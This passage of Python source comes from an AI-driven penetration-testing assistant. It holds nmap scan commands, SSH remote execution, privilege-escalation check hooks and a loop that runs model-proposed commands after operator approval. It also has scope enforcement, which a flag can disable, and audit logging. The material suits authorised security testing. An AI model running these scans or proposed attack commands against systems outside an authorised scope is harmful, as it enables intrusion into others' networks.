                    cprint("magenta", f"  ⚠ {reason}")
                    cprint("dim", f"    Authorize with: :scope add {new_target}")
            continue

        if user_input.startswith(":scope"):
            parts = user_input.split()
            if len(parts) == 1 or parts[1] == "show":
                cprint("cyan", f"  Scope: {guard.status()}")
                cprint("dim", f"  Audit trail: {guard.audit_path}")
            elif parts[1] == "add" and len(parts) >= 3:
                for t in parts[2:]:
                    guard.add(t)
                    guard.audit("scope_add", t, "", "operator added target to scope")
                cprint("green", f"  Added to scope. Now: {guard.status()}")
            elif parts[1] == "clear":
                guard.allowed.clear()
                guard.configured = False
                guard.audit("scope_clear", "", "", "operator cleared scope")
                cprint("yellow", "  Scope cleared — execution is now blocked (fail-closed).")
            else:
                cprint("dim", "  Usage: :scope [show] | :scope add <target...> | :scope clear")
            continue

        if user_input.startswith(":ssh-key"):
            parts = user_input.split(maxsplit=1)
            if len(parts) == 2:
                ssh_key_file = parts[1].strip()
                cprint("green", f"  SSH key set: {ssh_key_file}")
            continue

        if user_input.startswith(":ssh"):
            parts = user_input.split(maxsplit=1)
            ssh_user = session.credentials.get("username", "")
            ssh_host = session.target
            ssh_port = 22

            if len(parts) == 2:
                spec = parts[1].strip()
                if "@" in spec:
                    ssh_user, rest = spec.split("@", 1)
                    if ":" in rest:
                        ssh_host, port_s = rest.rsplit(":", 1)
                        try:
                            ssh_port = int(port_s)
                        except ValueError:
                            ssh_host = rest
                    else:
                        ssh_host = rest
                else:
                    ssh_host = spec

            if not ssh_user:
                reset_terminal(flush=True)
                ssh_user = input("  SSH username: ").strip()
            if not ssh_user:
                cprint("red", "  Username required.")
                continue

            ok_scope, reason = guard.check(ssh_host)
            if not ok_scope:
                guard.audit("blocked", ssh_host, "ssh connect", reason)
                cprint("red", f"  [BLOCKED] {reason}")
                cprint("dim", f"    Authorize with: :scope add {ssh_host}")
                continue
            cprint("dim", f"  Connecting SSH to {ssh_user}@{ssh_host}:{ssh_port}...")
            conn = SSHConnection(
                host=ssh_host, port=ssh_port, username=ssh_user,
                key_file=ssh_key_file,
                password=session.credentials.get("password"),
            )
            guard.audit("ssh_connect", ssh_host, f"{ssh_user}@{ssh_host}:{ssh_port}")
            ok, info = conn.connect()
            if ok:
                session.ssh = conn
                cprint("green", f"  SSH connected: {info}")
                if "linux" in info.lower() or "uid=" in info:
                    session.target_os = "linux"
                elif "windows" in info.lower() or "\\" in info:
                    session.target_os = "windows"
            else:
                cprint("red", f"  SSH failed: {info}")
            continue

        if user_input == ":disconnect":
            if session.ssh:
                session.ssh.close()
            session.ssh = None
            cprint("green", "  SSH disconnected.")
            continue

        if user_input == ":shell":
            manual_shell_mode(session)
            continue

        if user_input.startswith(":run "):
            cmd = user_input[5:].strip()
            if cmd:
                ok, reason = guard.check_free_command(cmd)
                if not ok:
                    guard.audit("blocked", session.target, cmd, reason)
                    cprint("red", f"  [BLOCKED] {reason}")
                    continue
                guard.audit("execute", session.target, cmd, "local :run")
                code, output = run_command(cmd)
                print(output)
                rec = CommandRecord(
                    phase=session.phase, command=cmd,
                    exit_code=code, output=output, useful=(code == 0 and bool(output.strip())),
                    note="direct local run",
                )
                session.commands.append(rec)
            continue

        if user_input.startswith(":rrun "):
            cmd = user_input[6:].strip()
            if not session.ssh:
                cprint("red", "  No SSH connection. Use :ssh first.")
                continue
            if cmd:
                ok, reason = guard.check(session.ssh.host)
                if not ok:
                    guard.audit("blocked", session.ssh.host, cmd, reason)
                    cprint("red", f"  [BLOCKED] {reason}")
                    continue
                guard.audit("execute", session.ssh.host, cmd, "remote :rrun")
                cprint("dim", f"  Running on {session.ssh.label}: {cmd}")
                code, output = session.ssh.run(cmd)
                print(output)
                rec = CommandRecord(
                    phase=session.phase, command=cmd,
                    exit_code=code, output=output,
                    useful=(code == 0 and bool(output.strip())),
                    note="direct remote run", remote=True,
                )
                session.commands.append(rec)
            continue

        if user_input == ":scan":
            cmd = f"nmap -Pn -sV --version-light --top-ports 100 -T3 {session.target}"
            _prior = session.prior_run(cmd, successful_only=True)
            approval = approve(cmd, warn=prior_warning(_prior) if _prior else "")
            if approval is not False:
                cmd_to_run = approval if isinstance(approval, str) else cmd
                cprint("dim", f"  Running: {cmd_to_run}")
                code, output = guarded_run(cmd_to_run, timeout=180)
                is_useful = code == 0 and len(output.strip()) > 10
                rec = CommandRecord(
                    phase="recon", command=cmd_to_run,
                    exit_code=code, output=output, useful=is_useful, note="quick scan",
                )
                session.commands.append(rec)
                print(output)
            continue

        if user_input == ":fullscan":
            cmd = f"nmap -Pn -p- -T4 --min-rate 1000 {session.target}"
            _prior = session.prior_run(cmd, successful_only=True)
            approval = approve(cmd, warn=prior_warning(_prior) if _prior else "")
            if approval is not False:
                cmd_to_run = approval if isinstance(approval, str) else cmd
                cprint("dim", f"  Running: {cmd_to_run}")
                code, output = guarded_run(cmd_to_run, timeout=600)
                is_useful = code == 0 and len(output.strip()) > 10
                rec = CommandRecord(
                    phase="recon", command=cmd_to_run,
                    exit_code=code, output=output, useful=is_useful, note="full scan",
                )
                session.commands.append(rec)
                print(output)
            continue

        if user_input.startswith(":svc"):
            tokens = user_input.split()
            if len(tokens) < 2:
                cprint("red", "  Usage: :svc <port> [redo]  (e.g. :svc 445)")
                cprint("dim", f"  Built-in ports: {', '.join(sorted(SERVICE_PORT_MAP.keys(), key=int))}")
                cprint("dim", "  Any other port -> AI generates dynamic checks from the banner.")
                cprint("dim", "  Add 'redo' to re-run checks already done earlier.")
                continue
            port = tokens[1].strip()
            svc_redo = "redo" in tokens[2:]
            if port in SERVICE_PORT_MAP:
                checks = SERVICE_PORT_MAP[port]
                cprint("cyan", f"  Service enum for port {port}:")
                run_auto_checks(checks, session, client, execute_cmd, parallel=parallel, redo=svc_redo)
            else:
                cprint("yellow", f"  No built-in checklist for port {port} — asking AI for dynamic checks.")
                bcmd = f"nmap -Pn -sV -p{port} {session.target}"
                approval = approve(bcmd)
                if approval is False:
                    continue
                bcmd_run = approval if isinstance(approval, str) else bcmd
                cprint("dim", f"  Running: {bcmd_run}")
                code, banner = guarded_run(bcmd_run, timeout=120)
                session.commands.append(CommandRecord(
                    phase=session.phase, command=bcmd_run, exit_code=code,
                    output=banner, useful=(code == 0 and bool(banner.strip())),
                    note=f"banner grab port {port}",
                ))
                print(banner)
                cprint("dim", "  Generating service-specific checks...")
                checks = generate_dynamic_checks(
                    client, session, port, distill_output(bcmd_run, banner),
                )
                if not checks:
                    cprint("red", "  AI produced no usable checks for this service.")
                    continue
                cprint("cyan", f"  AI proposed {len(checks)} checks for port {port}:")
                run_auto_checks(checks, session, client, execute_cmd, parallel=parallel, redo=svc_redo)
            continue

        if user_input == ":ports":
            cprint("dim", "  Scanning for open ports...")
            code, output = guarded_run(
                f"nmap -Pn --top-ports 200 -T4 --open {session.target}",
                timeout=120,
            )
            if code != 0:
                cprint("red", f"  Scan failed: {output}")
                continue
            detected: list[str] = []
            for line in output.splitlines():
                m = re.match(r"\s*(\d+)/tcp\s+open", line)
                if m:
                    detected.append(m.group(1))
            if not detected:
                cprint("yellow", "  No open TCP ports detected.")
                continue
            cprint("green", f"  Open ports: {', '.join(detected)}")
            has_checks = [p for p in detected if p in SERVICE_PORT_MAP]
            if has_checks:
                cprint("cyan", "  Service-specific checks available for:")
                for p in has_checks:
                    checks = SERVICE_PORT_MAP[p]
                    cprint("green", f"    Port {p}: {len(checks)} checks  → :svc {p}")
            else:
                cprint("dim", "  No service-specific checks for detected ports.")
            rec = CommandRecord(
                phase="recon", command=f"nmap -Pn --top-ports 200 -T4 --open {session.target}",
                exit_code=code, output=output, useful=bool(detected), note="port detection",
            )
            session.commands.append(rec)
            continue

        if user_input == ":tools":
            relevant = get_relevant_tools(session)
            if not relevant:
                cprint("dim", "  No tool suggestions for current phase/OS.")
                cprint("dim", "  Set :os and :phase first, or try from privesc phase.")
                continue
            cprint("cyan", f"\n  Tool suggestions for {session.phase} ({session.target_os or 'any OS'}):\n")
            for i, tool in enumerate(relevant, 1):
                cprint("yellow", f"  {i}. {tool['name']}")
                cprint("dim",    f"     {tool['description']}")
                if tool.get("prereq"):
                    cprint("dim", f"     Prereq: {tool['prereq']}")
                cprint("dim",    f"     Check:    {tool['condition']}")
                cprint("green",  f"     Download: {tool['download']}")
                cprint("green",  f"     Usage:    {tool['usage']}")
                print()
            cprint("dim", "  These tools need manual download. xs-ai checks conditions only.")
            cprint("dim", "  Run the 'Check' command via :run or :rrun to verify prerequisites.")
            continue

        if user_input == ":install":
            tools_to_check = list(TOOL_INSTALL_MAP.keys())
            cprint("cyan", f"\n  Checking {len(tools_to_check)} tools...")
            status = check_and_install_tools(tools_to_check)
            installed = [t for t, ok in status.items() if ok]
            missing = [t for t, ok in status.items() if not ok]
            cprint("green", f"  Installed ({len(installed)}): {', '.join(installed[:15])}{'...' if len(installed) > 15 else ''}")
            if missing:
                cprint("yellow", f"  Missing ({len(missing)}): {', '.join(missing)}")
            else:
                cprint("green", "  All tools installed!")
            continue

        if user_input.startswith(":memory"):
            parts = user_input.split(maxsplit=1)
            if len(parts) == 2 and parts[1] == "show":
                mem = generate_project_memory(session)
                print(mem)
            else:
                mem_path = save_project_memory(session)
                cprint("green", f"  Project memory saved: {mem_path}")
                cprint("dim", "  AI will load this automatically on next startup.")
            continue

        if user_input.startswith(":roles"):
            parts = user_input.split()
            if len(parts) == 1:
                cprint("cyan", "  Role mapping (phase -> model):")
                print(client.roles.summary())
                cprint("dim", f"  Default planner : {client.planner_model}")
                cprint("dim", f"  Default analyzer: {client.executor_model}")
            elif len(parts) == 2 and parts[1] == "save":
                save_roles_file(client.roles)
                cprint("green", "  Roles saved to roles.json")
            elif len(parts) == 2 and parts[1] == "clear":
                client.roles = RoleMap()
                cprint("green", "  All role overrides cleared (using defaults)")
            elif len(parts) >= 3 and parts[1] == "rm":
                role = parts[2]
                if client.roles.remove_role(role):
                    cprint("green", f"  Removed role override: {role}")
                else:
                    cprint("red", f"  No override for: {role}")
            elif len(parts) >= 3:
                role, model = parts[1], " ".join(parts[2:])
                client.roles.set_role(role, model)
                cprint("green", f"  {role} -> {model}")
            else:
                cprint("dim", "  Usage: :roles [<role> <model>] [save|clear|rm <role>]")
            continue

        if user_input.startswith(":auto"):
            auto_redo = "redo" in user_input.split()[1:]
            if session.phase == "recon":
                checks = RECON_CHECKS
            elif session.phase == "enum":
                checks = ENUM_WINDOWS_CHECKS if session.target_os == "windows" else ENUM_LINUX_CHECKS
            elif session.phase == "privesc":
                if session.target_os == "windows":
                    checks = PRIVESC_WINDOWS_CHECKS
                else:
                    checks = PRIVESC_LINUX_CHECKS
            else:
                cprint("red", "  Auto-enum available for: recon, enum, privesc")
                continue
            run_auto_checks(checks, session, client, execute_cmd, parallel=parallel, redo=auto_redo)
            continue

        if user_input.startswith(":research"):
            if research is None or research_engine is None:
                cprint("red", "  Research engine unavailable (research.py not found).")
                continue
            tokens = user_input.split()
            if len(tokens) < 2:
                cprint("red", "  Usage: :research <port>  (e.g. :research 8080)")
                continue
            port = tokens[1].strip()
            nmap_out = "\n".join(r.output for r in session.commands
                                 if "nmap" in r.command and r.useful)
            fp = research.fingerprint_for_port(port, nmap_out)
            if not fp.version and not fp.product:
                bcmd = f"nmap -Pn -sV -p{port} {session.target}"
                cprint("yellow", f"  No fingerprint for port {port} yet — grab a banner?")
                approval = approve(bcmd)
                if approval is not False:
                    cmd_to_run = approval if isinstance(approval, str) else bcmd
                    cprint("dim", f"  Running: {cmd_to_run}")
                    code, out = guarded_run(cmd_to_run, timeout=120)
                    if code == 0:
                        session.commands.append(CommandRecord(
                            phase=session.phase, command=cmd_to_run, exit_code=code,
                            output=out, useful=True, note=f"banner grab port {port}"))
                        fp = research.fingerprint_for_port(port, out)
            cprint("cyan", f"  Researching {fp.label()} on {session.target} "
                           f"(online={'yes' if online else 'no'})...")
            start = len(session.hypotheses) + 1
            try:
                hyps = research_engine.investigate(fp, session.target, client=client, start_idx=start)
            except Exception as exc:
                cprint("red", f"  Research error: {exc}")
                continue
            if not hyps:
                cprint("dim", "  No hypotheses — no leads for this service "
                              "(add a knowledge/ module or try --online).")
                continue
            for h in hyps:
                session.hypotheses.append(h.to_dict())
                print_hypothesis(h)
            cprint("dim", f"  {len(hyps)} hypotheses recorded — see :hypotheses.")
            continue

        if user_input.startswith(":validate"):
            if research is None:
                cprint("red", "  Research engine unavailable (research.py not found).")
                continue
            tokens = user_input.split()
            if len(tokens) < 2:
                cprint("red", "  Usage: :validate <hypothesis-id>  (e.g. :validate H001)")
                continue
            hid = tokens[1].strip().upper()
            hyp = next((h for h in session.hypotheses if h.get("id", "").upper() == hid), None)
            if not hyp:
                cprint("red", f"  No hypothesis {hid}. Use :hypotheses to list them.")
                continue
            cmd, kind = research.build_validation(hyp, session.target)
            if cmd is None:
                cprint("yellow", f"  {kind}")
                continue
            used = cred_used.get(hid, 0)
            if used >= cred_attempts:
                cprint("red", f"  Attempt limit reached for {hid} ({cred_attempts}). "
                              f"Stopping — no brute-force.")
                continue
            svc = (hyp.get("validation_hint", {}) or {}).get("service", "")
            cprint("cyan", f"  Validation for {hid} ({kind}) — single non-invasive check, "
                           f"attempt {used + 1}/{cred_attempts}")
            approval = approve(cmd)  # operator approval + (via guarded_run) scope check
            if approval is False:
                cprint("dim", "  Skipped.")
                continue
            cmd_to_run = approval if isinstance(approval, str) else cmd
            if cred_delay and used > 0:
                time.sleep(cred_delay)
            code, output = guarded_run(cmd_to_run, timeout=60)
            if output.startswith("[BLOCKED]"):
                continue  # scope guard already reported + audited
            cred_used[hid] = used + 1
            guard.audit("validate", session.target, cmd_to_run, f"hypothesis {hid}")
            status, conf, auth_state, note = research.classify_validation(kind, svc, code, output)
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
            hyp["status"] = status
            hyp["confidence"] = conf
            hyp["auth_state"] = auth_state
            hyp.setdefault("evidence", []).append(f"[validate {ts}] {note} (exit {code})")
            if output.strip():
                print("  " + output.strip()[:300].replace("\n", "\n  "))
            cprint("green", f"  -> {note}")
            cprint("dim", f"     status={status} confidence={conf} auth_state={auth_state}")
            if status == research.STATUS_CONFIRMED:
                finding = f"[{hid}] VALIDATED: {note} ({hyp.get('service','')})"
                if finding not in session.findings:
                    session.findings.append(finding)
                    cprint("green", f"  FINDING: {finding}")
            continue

        if user_input == ":hypotheses":
            if not session.hypotheses:
                cprint("dim", "  No research hypotheses yet. Use :research <port>.")
                continue
            cprint("cyan", f"\n  Research hypotheses ({len(session.hypotheses)}):")
            for h in session.hypotheses:
                cprint("yellow", f"  {h.get('id','?')} [{h.get('severity','?')}/"
                                 f"{h.get('confidence','?')}/{h.get('status','?')}] {h.get('service','')}")
                if h.get("observation"):
                    cprint("dim", f"       {h['observation']}")
            continue

        if user_input == ":chains":
            if research is None:
                cprint("red", "  Research engine unavailable (research.py not found).")
                continue
            if not session.hypotheses:
                cprint("dim", "  No hypotheses to link yet. Use :research <port> first.")
                continue
            cprint("dim", "  Analyzing attack chains across findings and hypotheses...")
            start = len(session.attack_chains) + 1
            try:
                chains = research.analyze_attack_chains(
                    session.target, session.hypotheses, session.findings,
                    client=client, start_idx=start)
            except Exception as exc:
                cprint("red", f"  Attack-chain analysis error: {exc}")
                continue
            if not chains:
                cprint("dim", "  No meaningful attack chains linking current observations.")
                continue
            for ch in chains:
                session.attack_chains.append(ch.to_dict())
                cprint("yellow", f"\n  [{ch.id}] {ch.title}  (confidence: {ch.confidence})")
                for i, step in enumerate(ch.steps, 1):
                    cprint("green", f"     {i}. {step}")
                if ch.assumptions:
                    cprint("magenta", f"     assumptions: {'; '.join(ch.assumptions)}")
                if ch.needed_evidence:
                    cprint("dim", f"     need: {'; '.join(ch.needed_evidence)}")
                if ch.impact:
                    cprint("dim", f"     impact: {ch.impact}")
            cprint("dim", f"\n  {len(chains)} chain(s) recorded (not proof of exploitation).")
            continue

        if user_input == ":findings":
            if session.findings:
                for i, f in enumerate(session.findings, 1):
                    cprint("green", f"  {i}. {f}")
            else:
                cprint("dim", "  No findings yet.")
            continue

        if user_input == ":history":
            print(session.all_commands_summary())
            continue

        if user_input == ":report":
            path = generate_report(session, report_dir)
            cprint("green", f"  Report saved: {path}")
            continue

        if user_input.startswith(":save"):
            parts = user_input.split(maxsplit=1)
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = parts[1] if len(parts) == 2 else f"sessions/session_{session.target.replace('.','_')}_{ts}.json"
            session.save_to_file(filepath)
            cprint("green", f"  Session saved: {filepath}")
            continue

        if user_input.startswith(":load"):
            parts = user_input.split(maxsplit=1)
            if len(parts) != 2:
                cprint("red", "  Usage: :load <file>")
                continue
            try:
                loaded = Session.load_from_file(parts[1], session.cheatsheet_context)
                session.target = loaded.target
                session.phase = loaded.phase
                session.target_os = loaded.target_os
                session.credentials = loaded.credentials
                session.findings = loaded.findings
                session.commands = loaded.commands
                cprint("green", f"  Loaded session: {loaded.target}, {len(loaded.commands)} commands, phase={loaded.phase}")
            except Exception as exc:
                cprint("red", f"  Load failed: {exc}")
            continue

        if user_input.startswith(":export"):
            parts = user_input.split(maxsplit=1)
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = parts[1] if len(parts) == 2 else f"sessions/handoff_{session.target.replace('.','_')}_{ts}.json"
            try:
                session.export_bundle(filepath)
                cprint("green", f"  Handoff bundle exported: {filepath}")
                cprint("dim", "  Share this file — the other operator runs :import <file> to continue.")
            except OSError as exc:
                cprint("red", f"  Export failed: {exc}")
            continue

        if user_input.startswith(":import"):
            parts = user_input.split(maxsplit=1)
            if len(parts) != 2:
                cprint("red", "  Usage: :import <file>  (merge another operator's handoff bundle)")
                continue
            try:
                with open(parts[1].strip(), encoding="utf-8") as f:
                    data = json.load(f)
                src = os.path.basename(parts[1].strip())
                stats = session.merge_from(data, source=src)
                cprint("green", f"  Imported from {src}:")
                cprint("green", f"    +{stats['commands']} commands, +{stats['findings']} findings, "
                                f"+{stats['credentials']} credentials, +{stats.get('hypotheses', 0)} hypotheses")
                cprint("dim", "  Their history now drives the re-test guard — already-done checks will be skipped.")
            except Exception as exc:
                cprint("red", f"  Import failed: {exc}")
            continue

        if user_input.startswith(":cheat"):
            parts = user_input.split(maxsplit=1)
            if len(parts) == 2:
                extra = load_cheatsheets([parts[1]])
                if extra:
                    session.cheatsheet_context += "\n\n---\n\n" + extra
                    cprint("green", f"  Loaded cheat sheet ({len(extra)} chars)")
            continue

        # --- AI interaction ---
        cprint("dim", "  Thinking...")
        structured = getattr(client, "structured", False)
        system, prompt = build_ai_prompt(session, user_input, structured=structured)
        try:
            raw = client.run_phase(session.phase, prompt, system, want_json=structured)
        except ConnectionError as exc:
            cprint("red", f"  AI error: {exc}")
            continue

        ai = parse_ai_response(raw)

        if structured:
            for line in ai.text.splitlines():
                if line.strip():
                    print(f"  {line}")
        else:
            for line in raw.splitlines():
                stripped = line.strip()
                if stripped.startswith("CMD:"):
                    continue
                if stripped:
                    print(f"  {line}")

        for f in ai.findings:
            if f not in session.findings:
                session.findings.append(f)
                cprint("green", f"  FINDING: {f}")

        if ai.access_line:
            cprint("yellow", f"\n  ACCESS ONE-LINER: {ai.access_line}")
            session.findings.append(f"[ACCESS] {ai.access_line}")

        for tool in ai.tool_suggestions:
            cprint("magenta", f"  TOOL SUGGESTION: {tool}")
            session.findings.append(f"[TOOL] {tool}")

        for need in ai.needs:
            cprint("yellow", f"  NEED: {need}")

        if ai.done:
            cprint("cyan", f"  DONE: {ai.done_summary}")
            continue

        if ai.command:
            is_remote = bool(session.ssh)
            _prior = session.prior_run(ai.command, successful_only=True)
            approval = approve(ai.command, remote=is_remote,
                               warn=prior_warning(_prior) if _prior else "")
            if approval is False:
                cprint("dim", "  Skipped.")
                continue

            cmd_to_run = approval if isinstance(approval, str) else ai.command

            cprint("dim", f"  Running{'(remote)' if is_remote else ''}: {cmd_to_run}")
            code, output = execute_cmd(cmd_to_run)
            is_useful = code == 0 and len(output.strip()) > 10
            rec = CommandRecord(
                phase=session.phase, command=cmd_to_run,
                exit_code=code, output=output, useful=is_useful,
                remote=is_remote,
            )
            session.commands.append(rec)

            if output:
                print(f"\n{output}\n")

            cprint("dim", "  Analyzing results...")
            analysis_prompt = (
                f"Command executed: {cmd_to_run}\n"
                f"Exit code: {code}\n"
                f"Output:\n{distill_output(cmd_to_run, output)}\n\n"
                f"Analyze this output. What did we learn? What should we try next?"
            )
            try:
                analysis = client.analyze(analysis_prompt, system, want_json=structured)
            except ConnectionError:
                analysis = ""

            analysis_parsed = parse_ai_response(analysis)
            for f in analysis_parsed.findings:
                if f not in session.findings:
                    session.findings.append(f)
                    cprint("green", f"  FINDING: {f}")

            if analysis_parsed.access_line:
                cprint("yellow", f"\n  ACCESS ONE-LINER: {analysis_parsed.access_line}")

            if structured:
                for line in analysis_parsed.text.splitlines():
                    if line.strip():
                        print(f"  {line}")
            else:
                for line in analysis.splitlines():
                    stripped = line.strip()
                    if stripped and not stripped.startswith(("CMD:", "FINDING:", "ACCESS:")):
                        print(f"  {line}")

            if analysis_parsed.command:
                rec.note = f"Next suggested: {analysis_parsed.command[:80]}"


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="xs-ai — Interactive AI pentest assistant",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Examples:
          python3 client.py --host 192.168.198.1
          python3 client.py --host 192.168.198.1 --target 10.10.110.123
          python3 client.py --host 192.168.198.1 --cheatsheet notes.md --phase enum
          python3 client.py --host 192.168.198.1 --load sessions/saved.json
        """),
    )
    p.add_argument("--host", required=True, help="Ollama host IP (Windows)")
    p.add_argument("--port", type=int, default=DEFAULT_PORT, help="Ollama port (default 11434)")
    p.add_argument("--target", help="Initial target IP")
    p.add_argument("--scope", default="scope.json", help="Scope file (default: scope.json)")
    p.add_argument("--cheatsheet", action="append", default=[],
                   help="Cheat sheet file or directory (can repeat)")
    p.add_argument("--phase", choices=PHASES, default="recon",
                   help="Starting phase")
    p.add_argument("--planner-model",
                   default="WhiteRabbitNeo/WhiteRabbitNeo-2.5-Qwen-2.5-Coder-7B:latest",
                   help="Planner model name")
    p.add_argument("--executor-model", default="qwen2.5-coder:7b",
                   help="Executor/analyzer model name")
    p.add_argument("--report-dir", default="reports", help="Report output directory")
    p.add_argument("--load", dest="load_session", help="Load a saved session file")
    p.add_argument("--os-type", dest="os_type", choices=("linux", "windows"),
                   help="Target OS type")
    p.add_argument("--api", choices=("ollama", "openai", "anthropic"), default="ollama",
                   help="AI backend (default: ollama)")
    p.add_argument("--api-key", help="API key for cloud backends (or set XS_API_KEY env)")
    p.add_argument("--api-url", help="Custom API base URL")
    p.add_argument("--no-memory", action="store_true",
                   help="Don't load/save project memory (project.md)")
    p.add_argument("--roles", default="roles.json",
                   help="Role mapping file (default: roles.json)")
    p.add_argument("--role", action="append", default=[], metavar="ROLE=MODEL",
                   help="Set a role mapping (e.g. --role recon=llama3.1:8b)")
    p.add_argument("--no-structured", action="store_true",
                   help="Disable schema-constrained JSON responses; use the legacy CMD: text protocol")
    p.add_argument("--parallel", action="store_true",
                   help="Run auto-enum checks concurrently after one batch approval")
    p.add_argument("--import", dest="import_file", action="append", default=[],
                   metavar="FILE",
                   help="Merge another operator's handoff bundle at startup (repeatable)")
    p.add_argument("--allow-any-target", action="store_true",
                   help="DANGER: disable scope enforcement and permit any target "
                        "(default is fail-closed — execution blocked until a scope is configured)")
    p.add_argument("--audit-log", default="audit.log",
                   help="Execution/approval audit trail file (default: audit.log)")
    p.add_argument("--online", action="store_true",
                   help="Allow the research engine to query external sources (e.g. NVD). "
                        "Off by default — research works fully offline from the local knowledge base")
    p.add_argument("--cred-attempts", type=int, default=3,
                   help="Max validation attempts per hypothesis (no brute-force; default 3)")
    p.add_argument("--cred-delay", type=float, default=0.0,
                   help="Seconds to wait between validation attempts (default 0)")
    return p


def main() -> int:
    args = build_parser().parse_args()

    # snapshot a sane terminal state so prompts can recover echo after a
    # subprocess (ssh/apt/etc.) leaves the TTY with echo or canonical mode off
    save_terminal()

    # -- Load role mapping --
    roles = load_roles_file(args.roles)
    for entry in args.role:
        if "=" in entry:
            k, v = entry.split("=", 1)
            roles.set_role(k.strip(), v.strip())

    # -- Build AI backend --
    api_key = args.api_key or os.environ.get("XS_API_KEY", "")
    if args.api == "ollama":
        base_url = args.api_url or f"http://{args.host}:{args.port}"
        client = AIBackend(
            backend="ollama", base_url=base_url, api_key="",
            planner_model=args.planner_model,
            executor_model=args.executor_model,
            roles=roles, structured=not args.no_structured,
        )
    elif args.api == "openai":
        if not api_key:
            print("[FAIL] --api-key or XS_API_KEY required for OpenAI backend")
            return 1
        base_url = args.api_url or "https://api.openai.com/v1"
        planner = args.planner_model if args.planner_model != build_parser().get_default("planner_model") else "gpt-4o"
        executor = args.executor_model if args.executor_model != "qwen2.5-coder:7b" else "gpt-4o-mini"
        client = AIBackend(
            backend="openai", base_url=base_url, api_key=api_key,
            planner_model=planner, executor_model=executor,
            roles=roles, structured=not args.no_structured,
        )
        print("[!] WARNING: Cloud API mode — command outputs are sent to external servers.")
        print("    Do NOT use on engagements with strict data-handling requirements.")
    elif args.api == "anthropic":
        if not api_key:
            print("[FAIL] --api-key or XS_API_KEY required for Anthropic backend")
            return 1
        base_url = args.api_url or "https://api.anthropic.com/v1"
        planner = args.planner_model if args.planner_model != build_parser().get_default("planner_model") else "claude-sonnet-4-20250514"
        executor = args.executor_model if args.executor_model != "qwen2.5-coder:7b" else "claude-haiku-4-20250414"
        client = AIBackend(
            backend="anthropic", base_url=base_url, api_key=api_key,
            planner_model=planner, executor_model=executor,
            roles=roles, structured=not args.no_structured,
        )
        print("[!] WARNING: Cloud API mode — command outputs are sent to external servers.")
        print("    Do NOT use on engagements with strict data-handling requirements.")
    else:
        print(f"[FAIL] Unknown API backend: {args.api}")
        return 1

    if roles.mapping:
        print(f"[OK] Role overrides loaded ({len(roles.mapping)} roles)")
        for r, m in roles.mapping.items():
            print(f"     {r} -> {m}")

    print(f"[*] Connecting to {args.api} at {client.base_url}...")
    try:
        models = client.ping()
        print(f"[OK] Models available: {', '.join(models)}")
    except Exception as exc:
        print(f"[FAIL] Cannot reach AI backend: {exc}")
        if args.api == "ollama":
            print(f"       Make sure host_setup.ps1 has been run on {args.host}")
        return 1

    guard = build_scope_guard(args.scope, args.allow_any_target,
                              cli_target=args.target or "", audit_path=args.audit_log)
    scope = set(guard.allowed)  # kept for backward-compat with existing checks
    if args.allow_any_target:
        print("[!] DANGER: --allow-any-target — scope enforcement DISABLED; any target permitted.")
    elif guard.configured:
        print(f"[OK] Scope: {guard.status()}")
    else:
        print(f"[!] No authorized scope ({args.scope}). FAIL-CLOSED: execution is blocked")
        print("    until you configure targets (scope.json, --target, :scope add, or --allow-any-target).")
        print("    Research and planning still work without executing commands.")

    # Load cheat sheets
    cheat_paths = args.cheatsheet or []
    if os.path.isdir("cheatsheets"):
        cheat_paths.append("cheatsheets")
    cheatsheet_ctx = load_cheatsheets(cheat_paths) if cheat_paths else ""

    # Load project memory
    if not args.no_memory:
        project_mem = load_project_memory()
        if project_mem:
            cheatsheet_ctx = project_mem + "\n\n---\n\n" + cheatsheet_ctx if cheatsheet_ctx else project_mem
            print(f"[OK] Project memory loaded (project.md)")

    # Load or create session
    if args.load_session:
        try:
            session = Session.load_from_file(args.load_session, cheatsheet_ctx)
            print(f"[OK] Loaded session: {session.target}, {len(session.commands)} commands")
        except Exception as exc:
            print(f"[FAIL] Cannot load session: {exc}")
            return 1
    else:
        target = args.target
        if not target:
            if scope:
                targets = sorted(scope)
                if len(targets) == 1:
                    target = targets[0]
                    print(f"[*] Auto-selected target from scope: {target}")
                else:
                    print(f"[*] Targets in scope: {', '.join(targets)}")
                    target = input("[?] Enter target IP: ").strip()
            else:
                target = input("[?] Enter target IP: ").strip()

        if not target:
            print("[FAIL] No target specified.")
            return 1

        ok_scope, reason = guard.check(target)
        if not ok_scope:
            print(f"[!] {reason}")
            print(f"    Execution against {target} is blocked until authorized "
                  f"(:scope add {target} in-session, or --allow-any-target).")

        session = Session(
            target=target,
            phase=args.phase,
            cheatsheet_context=cheatsheet_ctx,
            target_os=args.os_type or "",
        )

    # Merge any handoff bundles passed on the command line (another operator's work)
    for imp in args.import_file:
        try:
            with open(imp, encoding="utf-8") as f:
                data = json.load(f)
            stats = session.merge_from(data, source=os.path.basename(imp))
            print(f"[OK] Imported {os.path.basename(imp)}: "
                  f"+{stats['commands']} commands, +{stats['findings']} findings, "
                  f"+{stats['credentials']} credentials, +{stats.get('hypotheses', 0)} hypotheses")
        except Exception as exc:
            print(f"[!] Could not import {imp}: {exc}")

    try:
        interactive_loop(client, session, scope, args.report_dir,
                         parallel=args.parallel, guard=guard, online=args.online,
                         cred_attempts=args.cred_attempts, cred_delay=args.cred_delay)
    except KeyboardInterrupt:
        print("\n[*] Interrupted.")
    finally:
        if session.ssh:
            session.ssh.close()
        if session.commands:
            path = generate_report(session, args.report_dir)
            print(f"\n[*] Report saved: {path}")
            # Auto-save the full session JSON (untruncated outputs) so the raw
            # evidence always survives on disk, not just the distilled copy.
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            sess_path = os.path.join(
                "sessions", f"session_{session.target.replace('.', '_')}_{ts}.json")
            try:
                session.save_to_file(sess_path)
                print(f"[*] Full session saved: {sess_path}")
            except OSError as exc:
                print(f"[!] Could not auto-save session: {exc}")
            if not args.no_memory:
                mem_path = save_project_memory(session)
                print(f"[*] Project memory saved: {mem_path}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
